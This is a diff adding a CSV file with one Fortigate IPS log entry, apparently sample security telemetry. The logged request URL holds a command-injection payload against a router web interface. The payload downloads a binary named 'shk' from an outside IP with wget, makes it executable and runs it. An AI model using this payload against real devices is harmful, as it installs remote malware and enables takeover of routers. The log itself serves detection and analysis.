@@ -1,0 +1,2 @@
+managerReceiptTime,sourceAddress,sourceHostName,destinationAddress,destinationHostName,requestUrl,deviceAction,deviceProduct,destinationPort,destinationServiceName,bytesIn,bytesOut,requestClientApplication
+"May 3, 2024 @ 20:49:05.842",195.1.144.109,no4.nordicvm.no,65.74.2.33,web.seesec.co.il,/cgi-bin/luci/;stok\=/locale?form\=country&operation\=write&country\=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`),Accept,Fortigate IPS,80,HTTP,800B,4860KB,Go-http-client/1.1
